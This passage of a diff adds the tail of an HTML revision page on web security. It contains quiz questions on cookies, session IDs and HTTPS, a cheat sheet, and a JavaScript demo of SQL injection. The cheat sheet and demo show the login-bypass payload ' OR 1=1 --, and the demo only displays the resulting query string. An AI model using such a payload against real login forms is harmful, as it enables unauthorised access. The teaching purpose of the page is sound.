+      <strong>Answer: B.</strong> In SQL, <code>--</code> begins a line comment. Everything after <code>--</code> (including <code>AND password='...'</code>) is ignored by the database engine. This neutralises the password check.
+    </div>
+  </div>
+
+  <div class="quiz-q" id="q7">
+    <div class="question">7. An HttpOnly cookie flag means:</div>
+    <label class="quiz-option"><input type="radio" name="q7" value="a"> <span>A. The cookie only works over HTTP, not HTTPS</span></label>
+    <label class="quiz-option"><input type="radio" name="q7" value="b"> <span>B. The cookie cannot be accessed by JavaScript (document.cookie)</span></label>
+    <label class="quiz-option"><input type="radio" name="q7" value="c"> <span>C. The cookie is encrypted</span></label>
+    <label class="quiz-option"><input type="radio" name="q7" value="d"> <span>D. The cookie is sent only with POST requests</span></label>
+    <div class="quiz-explain" id="q7-exp">
+      <strong>Answer: B.</strong> HttpOnly is a security flag that prevents JavaScript from accessing the cookie via <code>document.cookie</code>. This stops XSS attacks from stealing session cookies. "Secure" flag (separate) ensures cookie is only sent over HTTPS.
+    </div>
+  </div>
+
+  <div class="quiz-q" id="q8">
+    <div class="question">8. URL session IDs are a security risk mainly because:</div>
+    <label class="quiz-option"><input type="radio" name="q8" value="a"> <span>A. URLs are always visible on the network</span></label>
+    <label class="quiz-option"><input type="radio" name="q8" value="b"> <span>B. Session IDs in URLs can leak via browser history, Referer headers, and server logs</span></label>
+    <label class="quiz-option"><input type="radio" name="q8" value="c"> <span>C. Browsers automatically delete URL parameters</span></label>
+    <label class="quiz-option"><input type="radio" name="q8" value="d"> <span>D. URL session IDs are always unencrypted</span></label>
+    <div class="quiz-explain" id="q8-exp">
+      <strong>Answer: B.</strong> Even over HTTPS, URL parameters are stored in browser history, bookmarks, server access logs, and sent in the HTTP Referer header to external sites. This exposes session IDs to more parties than cookie-based sessions.
+    </div>
+  </div>
+
+  <div class="quiz-q" id="q9">
+    <div class="question">9. The CardSystems SQL injection attack (2005) resulted in:</div>
+    <label class="quiz-option"><input type="radio" name="q9" value="a"> <span>A. 263 stolen credit card numbers</span></label>
+    <label class="quiz-option"><input type="radio" name="q9" value="b"> <span>B. The company being fined $10 million</span></label>
+    <label class="quiz-option"><input type="radio" name="q9" value="c"> <span>C. 263,000 stolen card numbers, 43 million exposed — company put out of business</span></label>
+    <label class="quiz-option"><input type="radio" name="q9" value="d"> <span>D. A temporary service outage for 48 hours</span></label>
+    <div class="quiz-explain" id="q9-exp">
+      <strong>Answer: C.</strong> CardSystems was a credit card payment processor. June 2005 SQL injection: 263,000 card numbers stolen, 43 million exposed. Data was stored unencrypted. The company was subsequently put out of business — a powerful real-world example of the consequences of SQL injection.
+    </div>
+  </div>
+
+  <div class="quiz-q" id="q10">
+    <div class="question">10. HTTPS provides security over HTTP by:</div>
+    <label class="quiz-option"><input type="radio" name="q10" value="a"> <span>A. Compressing the data to make it smaller</span></label>
+    <label class="quiz-option"><input type="radio" name="q10" value="b"> <span>B. Wrapping HTTP in TLS encryption, preventing eavesdropping and tampering</span></label>
+    <label class="quiz-option"><input type="radio" name="q10" value="c"> <span>C. Running on a separate port to avoid attacks</span></label>
+    <label class="quiz-option"><input type="radio" name="q10" value="d"> <span>D. Using SSL which is more secure than TLS</span></label>
+    <div class="quiz-explain" id="q10-exp">
+      <strong>Answer: B.</strong> HTTPS = HTTP + TLS. TLS (Transport Layer Security) encrypts the HTTP traffic, preventing eavesdropping, man-in-the-middle attacks, and tampering. SSL is the deprecated predecessor — TLS is now standard. Running on port 443 vs 80 is just convention, not a security mechanism.
+    </div>
+  </div>
+
+  <button class="demo-btn" onclick="checkQuiz()" style="margin-top:1rem;font-size:1rem;padding:0.7rem 2rem">Submit Quiz</button>
+  <div class="quiz-result" id="quizResult" style="display:none"></div>
+</div>
+</section>
+
+<!-- ═══════════════════════════════════ CHEAT SHEET ═══════════════════════════════════ -->
+<section>
+<h2>📌 Exam Cheat Sheet — Quick Reference</h2>
+<div class="card-grid">
+  <div class="card red">
+    <h4>SQL Injection</h4>
+    <ul style="padding-left:1.2rem;font-size:0.85rem">
+      <li>Input → SQL query manipulation</li>
+      <li>Classic: <code>' OR 1=1 --</code></li>
+      <li>Targets: database (server-side)</li>
+      <li>Fix: prepared statements / ORM</li>
+      <li>Real case: CardSystems 2005</li>
+    </ul>
+  </div>
+  <div class="card orange">
+    <h4>CSRF</h4>
+    <ul style="padding-left:1.2rem;font-size:0.85rem">
+      <li>Cross-site = forged from evil site</li>
+      <li>Exploits auto-sent session cookie</li>
+      <li>Also: "session riding", "one-click"</li>
+      <li>Targets: victim server</li>
+      <li>Fix: CSRF token, SameSite cookie</li>
+    </ul>
+  </div>
+  <div class="card yellow" style="border-left:3px solid var(--yellow)">
+    <h4>XSS</h4>
+    <ul style="padding-left:1.2rem;font-size:0.85rem">
+      <li>Injects JS into trusted site</li>
+      <li>Reflected = via crafted URL</li>
+      <li>Stored = persists in DB</li>
+      <li>Targets: victim's browser</li>
+      <li>Fix: output encoding, HttpOnly</li>
+    </ul>
+  </div>
+  <div class="card green">
+    <h4>Sessions</h4>
+    <ul style="padding-left:1.2rem;font-size:0.85rem">
+      <li>HTTP is stateless → sessions</li>
+      <li>Session ID = random number in cookie</li>
+      <li>URL session IDs are risky!</li>
+      <li>Use: HttpOnly, Secure, SameSite</li>
+      <li>Session timeout after inactivity</li>
+    </ul>
+  </div>
+  <div class="card accent">
+    <h4>Password Threats</h4>
+    <ul style="padding-left:1.2rem;font-size:0.85rem">
+      <li>Brute force → lockout + long passwords</li>
+      <li>Dictionary → complex + salted hash</li>
+      <li>Keylog → MFA + AV</li>
+      <li>Phishing → MFA + training</li>
+      <li>Shoulder surf → privacy screen</li>
+    </ul>
+  </div>
+  <div class="card purple">
+    <h4>Email Investigation</h4>
+    <ul style="padding-left:1.2rem;font-size:0.85rem">
+      <li>Check: sender address, grammar, urgency</li>
+      <li>Forensics: IP (headers), domain (OSINT), attachment (sandbox)</li>
+      <li>Response: don't click, report to IT</li>
+    </ul>
+  </div>
+</div>
+</section>
+
+</div><!-- /container -->
+
+<script>
+// Progress bar
+window.addEventListener('scroll', () => {
+  const scrollTop = window.scrollY;
+  const docH = document.documentElement.scrollHeight - window.innerHeight;
+  const pct = docH > 0 ? (scrollTop / docH) * 100 : 0;
+  document.getElementById('progressBar').style.width = pct + '%';
+});
+
+// Tab switching
+function switchTab(tabEl, targetId) {
+  const tabs = tabEl.parentElement.querySelectorAll('.tab');
+  const contents = tabEl.parentElement.nextElementSibling;
+  // Get all sibling tab-content elements
+  let el = tabEl.parentElement.nextElementSibling;
+  while (el && el.classList.contains('tab-content')) {
+    el.classList.remove('active');
+    el = el.nextElementSibling;
+  }
+  tabs.forEach(t => t.classList.remove('active'));
+  tabEl.classList.add('active');
+  document.getElementById('tab-' + targetId).classList.add('active');
+}
+
+// Toggle solution
+function toggleSolution(btn) {
+  const sol = btn.nextElementSibling;
+  sol.classList.toggle('visible');
+  btn.textContent = sol.classList.contains('visible') ? 'Hide Solution ▲' : 'Show Solution ▼';
+}
+
+// SQL demo
+function runSQLDemo(injectMode) {
+  const user = document.getElementById('sqliUser').value;
+  const pass = document.getElementById('sqliPass').value;
+  const out = document.getElementById('sqliOutput');
+
+  let query, result, dangerous = false;
+  if (injectMode) {
+    const injUser = "' or 1=1 --";
+    query = `SELECT * FROM Users WHERE user='${injUser}' AND pwd='${pass}'`;
+    const sanitizedQuery = `SELECT * FROM Users WHERE user='' or 1=1 --' AND pwd='${pass}'`;
+    out.innerHTML = `<span style="color:var(--muted)">Query:</span> <span style="color:var(--red)">${sanitizedQuery}</span>\n\n` +
+      `<span style="color:var(--red)">⚠ INJECTED: 1=1 is always TRUE, password check commented out!\n` +
+      `✗ LOGIN BYPASSED — all users returned!</span>`;
+    out.className = 'demo-output danger';
+  } else {
+    query = `SELECT * FROM Users WHERE user='${user}' AND pwd='${pass}'`;
+    const safe = !user.includes("'") && !user.includes(";") && !user.includes("--");
+    if (safe) {
+      out.innerHTML = `<span style="color:var(--muted)">Query:</span> <span style="color:var(--green)">${query}</span>\n\n` +
+        `<span style="color:var(--green)">✓ Normal query — only matches exact user/password pair.</span>`;
+      out.className = 'demo-output safe';
+    } else {
+      out.innerHTML = `<span style="color:var(--muted)">Query:</span> <span style="color:var(--red)">${query}</span>\n\n` +
+        `<span style="color:var(--red)">⚠ Suspicious characters detected in input!</span>`;
+      out.className = 'demo-output danger';
+    }
+  }
+}
+
+// Quiz
+const answers = {q1:'b',q2:'c',q3:'b',q4:'b',q5:'c',q6:'b',q7:'b',q8:'b',q9:'c',q10:'b'};
+
+function checkQuiz() {
+  let score = 0;
+  let answered = 0;
+  for (let i = 1; i <= 10; i++) {
+    const qname = 'q' + i;
+    const selected = document.querySelector(`input[name="${qname}"]:checked`);
+    const qEl = document.getElementById(qname);
+    const options = qEl.querySelectorAll('.quiz-option');
+    const explain = document.getElementById(qname + '-exp');
+
+    options.forEach(opt => {
+      opt.classList.remove('correct','wrong');
+      const radio = opt.querySelector('input');
+      if (radio.value === answers[qname]) opt.classList.add('correct');
+    });
+
+    if (selected) {
+      answered++;
+      if (selected.value === answers[qname]) {
+        score++;
+      } else {
+        selected.parentElement.classList.add('wrong');
+      }
+    }
+    explain.style.display = 'block';
+  }
+
+  const result = document.getElementById('quizResult');
+  result.style.display = 'block';
+  const pct = Math.round(score/10*100);
+  const grade = pct >= 80 ? 'Excellent!' : pct >= 60 ? 'Good work' : 'Keep revising';
+  const color = pct >= 80 ? 'var(--green)' : pct >= 60 ? 'var(--yellow)' : 'var(--red)';
+  result.innerHTML = `
+    <div class="score-big" style="color:${color}">${score}/10</div>
+    <div style="color:var(--muted);margin-top:0.5rem">${pct}% — ${grade}</div>
+    <p style="margin-top:0.5rem;color:var(--muted);font-size:0.9rem">Review the explanations above for any incorrect answers.</p>`;
+  result.scrollIntoView({behavior:'smooth'});
+}
+
+// Smooth scroll for nav
+document.querySelectorAll('nav a').forEach(a => {
+  a.addEventListener('click', e => {
+    e.preventDefault();
+    const target = document.querySelector(a.getAttribute('href'));
+    if (target) target.scrollIntoView({behavior:'smooth'});
+  });
+});
+</script>
+</body>
+</html>
